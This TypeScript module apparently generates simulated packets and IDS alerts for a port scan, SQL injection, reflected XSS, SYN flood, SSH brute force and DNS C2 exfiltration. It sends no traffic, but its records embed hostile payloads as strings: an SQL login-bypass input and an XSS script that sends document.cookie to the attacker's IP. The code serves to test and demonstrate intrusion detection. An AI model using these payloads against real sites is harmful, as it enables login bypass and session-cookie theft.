import { Packet, SecurityAlert } from "../src/types";

export type AttackType = "PORT_SCAN" | "SQL_INJECTION" | "XSS_ATTACK" | "SYN_FLOOD" | "SSH_BRUTE_FORCE" | "DNS_C2_EXFIL";

export interface AttackSimulationResult {
  attackType: AttackType;
  packets: Packet[];
  alert: SecurityAlert;
  summary: string;
}

export function generateAttackPackets(
  attackType: AttackType,
  targetIp: string,
  attackerIp: string,
  startId: number
): AttackSimulationResult {
  const timestamp = new Date().toISOString();
  const packets: Packet[] = [];
  let alert: SecurityAlert;
  let summary = "";

  switch (attackType) {
    case "SQL_INJECTION": {
      summary = `SQL Injection Attack payload injected targeting ${targetIp}:80`;
      const payloadText = `POST /login.php HTTP/1.1\r\nHost: ${targetIp}\r\nUser-Agent: Mozilla/5.0 (Hydra-IDS-Scanner)\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin' OR '1'='1'--&password=foo`;
      const payloadBuf = Buffer.from(payloadText, "utf-8");
      const payloadHex = Array.from(payloadBuf).map(b => b.toString(16).padStart(2, "0")).join(" ");
      const payloadAscii = Array.from(payloadBuf).map(b => (b >= 32 && b <= 126 ? String.fromCharCode(b) : ".")).join("");

      packets.push({
        id: startId + 1,
        timestamp,
        protocol: "HTTP",
        srcIp: attackerIp,
        dstIp: targetIp,
        srcPort: 52104,
        dstPort: 80,
        macSrc: "00:0c:29:ab:12:34",
        macDst: "00:50:56:c0:00:01",
        size: 54 + payloadBuf.length,
        ttl: 64,
        tcpFlags: "PSH, ACK",
        checksum: "0x9f4a",
        payloadSize: payloadBuf.length,
        direction: "INCOMING",
        interface: "ids-sim0",
        summary: `[IDS SIMULATED ATTACK] HTTP POST /login.php | Payload: username=admin' OR '1'='1'--`,
        payloadHex,
        payloadAscii,
        tagged: "SQL_INJECTION",
        blocked: false
      });

      alert = {
        id: `alert_sqli_${Date.now()}`,
        timestamp,
        severity: "CRITICAL",
        type: "SQL Injection Vector",
        source: attackerIp,
        destination: `${targetIp}:80`,
        message: `CRITICAL IDS ALERT: Detected Web Application SQL Injection attempt matching signature SQLI-09. Malicious payload "admin' OR '1'='1'--" sent to endpoint ${targetIp}:80.`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }

    case "XSS_ATTACK": {
      summary = `Cross-Site Scripting (XSS) exploit payload targeting ${targetIp}:80`;
      const payloadText = `GET /search?q=<script>fetch('http://${attackerIp}/c?cookie='+document.cookie)</script> HTTP/1.1\r\nHost: ${targetIp}\r\n\r\n`;
      const payloadBuf = Buffer.from(payloadText, "utf-8");
      const payloadHex = Array.from(payloadBuf).map(b => b.toString(16).padStart(2, "0")).join(" ");
      const payloadAscii = Array.from(payloadBuf).map(b => (b >= 32 && b <= 126 ? String.fromCharCode(b) : ".")).join("");

      packets.push({
        id: startId + 1,
        timestamp,
        protocol: "HTTP",
        srcIp: attackerIp,
        dstIp: targetIp,
        srcPort: 53102,
        dstPort: 80,
        macSrc: "00:0c:29:ab:12:34",
        macDst: "00:50:56:c0:00:01",
        size: 54 + payloadBuf.length,
        ttl: 64,
        tcpFlags: "PSH, ACK",
        checksum: "0x8e12",
        payloadSize: payloadBuf.length,
        direction: "INCOMING",
        interface: "ids-sim0",
        summary: `[IDS SIMULATED ATTACK] HTTP GET /search?q=<script>... Cookie Theft Payload`,
        payloadHex,
        payloadAscii,
        tagged: "XSS_ATTACK",
        blocked: false
      });

      alert = {
        id: `alert_xss_${Date.now()}`,
        timestamp,
        severity: "HIGH",
        type: "Cross-Site Scripting (XSS)",
        source: attackerIp,
        destination: `${targetIp}:80`,
        message: `HIGH IDS ALERT: Reflected XSS payload execution vector detected targeting ${targetIp}. Script tag attempted exfiltration of session cookies to ${attackerIp}.`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }

    case "SYN_FLOOD": {
      summary = `SYN Flood DoS attack burst from ${attackerIp} targeting ${targetIp}:443`;
      for (let i = 0; i < 10; i++) {
        const srcPort = Math.floor(Math.random() * 40000) + 10000;
        packets.push({
          id: startId + i + 1,
          timestamp: new Date(Date.now() - (10 - i) * 100).toISOString(),
          protocol: "TCP",
          srcIp: attackerIp,
          dstIp: targetIp,
          srcPort,
          dstPort: 443,
          macSrc: "00:0c:29:ab:12:34",
          macDst: "00:50:56:c0:00:01",
          size: 64,
          ttl: 64,
          tcpFlags: "SYN",
          checksum: "0x" + Math.floor(Math.random() * 0xffff).toString(16),
          payloadSize: 0,
          direction: "INCOMING",
          interface: "ids-sim0",
          summary: `[IDS SIMULATED ATTACK] TCP SYN Flood: ${attackerIp}:${srcPort} -> ${targetIp}:443 [SYN] Seq=0 Win=1024`,
          tagged: "SYN_FLOOD",
          blocked: false
        });
      }

      alert = {
        id: `alert_syn_${Date.now()}`,
        timestamp,
        severity: "CRITICAL",
        type: "TCP SYN Flood DoS",
        source: attackerIp,
        destination: `${targetIp}:443`,
        message: `CRITICAL IDS ALERT: High-volume TCP SYN Flood Denial-of-Service attack detected originating from ${attackerIp}. Resource exhaustion vector on port 443.`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }

    case "SSH_BRUTE_FORCE": {
      summary = `SSH Brute-Force Auth attack from ${attackerIp} to ${targetIp}:22`;
      for (let i = 0; i < 6; i++) {
        packets.push({
          id: startId + i + 1,
          timestamp: new Date(Date.now() - (6 - i) * 200).toISOString(),
          protocol: "SSH",
          srcIp: attackerIp,
          dstIp: targetIp,
          srcPort: 49100 + i,
          dstPort: 22,
          macSrc: "00:0c:29:ab:12:34",
          macDst: "00:50:56:c0:00:01",
          size: 148,
          ttl: 64,
          tcpFlags: "PSH, ACK",
          checksum: "0x77b2",
          payloadSize: 94,
          direction: "INCOMING",
          interface: "ids-sim0",
          summary: `[IDS SIMULATED ATTACK] SSHv2 Password Auth Failure (User: root / attempt ${i + 1})`,
          tagged: "SSH_BRUTE_FORCE",
          blocked: false
        });
      }

      alert = {
        id: `alert_ssh_${Date.now()}`,
        timestamp,
        severity: "HIGH",
        type: "SSH Password Brute Force",
        source: attackerIp,
        destination: `${targetIp}:22`,
        message: `HIGH IDS ALERT: Automated SSH credential brute-force dictionary attack detected from ${attackerIp}. 6 failed root logins in 1.2 seconds.`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }

    case "DNS_C2_EXFIL": {
      summary = `DNS C2 Tunneling Data Exfiltration vector from ${attackerIp} to ${targetIp}`;
      const queryName = "a8f912c4b912e8a101293f.c2-exfil-botnet.top";
      packets.push({
        id: startId + 1,
        timestamp,
        protocol: "DNS",
        srcIp: targetIp,
        dstIp: "8.8.8.8",
        srcPort: 54321,
        dstPort: 53,
        macSrc: "00:0c:29:ab:12:34",
        macDst: "00:50:56:c0:00:01",
        size: 124,
        ttl: 64,
        checksum: "0x44a1",
        payloadSize: 70,
        direction: "OUTGOING",
        interface: "ids-sim0",
        summary: `[IDS SIMULATED ATTACK] DNS Query A ${queryName} | Suspected C2 Exfiltration`,
        tagged: "DNS_C2_EXFIL",
        blocked: false
      });

      alert = {
        id: `alert_dns_${Date.now()}`,
        timestamp,
        severity: "HIGH",
        type: "DNS C2 Tunneling Exfiltration",
        source: targetIp,
        destination: "8.8.8.8 (DNS)",
        message: `HIGH IDS ALERT: Encoded DNS C2 tunnel payload exfiltration attempt detected to suspicious domain "${queryName}".`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }

    default: { // PORT_SCAN
      summary = `Port Scan Reconnaissance Probe from ${attackerIp} to ${targetIp}`;
      const probePorts = [21, 22, 23, 80, 443, 3389, 8080];
      probePorts.forEach((port, idx) => {
        packets.push({
          id: startId + idx + 1,
          timestamp: new Date(Date.now() - (probePorts.length - idx) * 150).toISOString(),
          protocol: "TCP",
          srcIp: attackerIp,
          dstIp: targetIp,
          srcPort: 60000 + idx,
          dstPort: port,
          macSrc: "00:0c:29:ab:12:34",
          macDst: "00:50:56:c0:00:01",
          size: 64,
          ttl: 64,
          tcpFlags: "SYN",
          checksum: "0x1122",
          payloadSize: 0,
          direction: "INCOMING",
          interface: "ids-sim0",
          summary: `[IDS SIMULATED ATTACK] Recon Scan Probe: ${attackerIp}:${60000 + idx} -> ${targetIp}:${port} [SYN]`,
          tagged: "PORT_SCAN",
          blocked: false
        });
      });

      alert = {
        id: `alert_scan_${Date.now()}`,
        timestamp,
        severity: "HIGH",
        type: "Port Scan Reconnaissance",
        source: attackerIp,
        destination: targetIp,
        message: `HIGH IDS ALERT: Automated Port Scan detected from ${attackerIp} probing 7 common service ports (${probePorts.join(", ")}) on host ${targetIp}.`,
        packetId: startId + 1,
        resolved: false
      };
      break;
    }
  }

  return {
    attackType,
    packets,
    alert,
    summary
  };
}
